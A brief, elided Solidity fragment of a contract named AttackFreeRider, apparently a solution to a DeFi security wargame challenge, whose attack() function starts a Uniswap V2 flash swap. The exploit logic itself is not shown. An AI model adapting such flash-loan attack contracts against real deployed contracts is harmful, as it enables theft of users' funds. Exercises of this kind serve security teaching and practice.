...
contract AttackFreeRider is IUniswapV2Callee {
    UniswapV2Pair private uniswapV2Pair;
    ...
    constructor(
        ...
        uniswapV2Pair = UniswapV2Pair(_uniswapPairAddress);
    ...
    function attack(uint256 amount) external payable {
        uniswapV2Pair.swap(amount, 0, address(this), new bytes(0));
    }
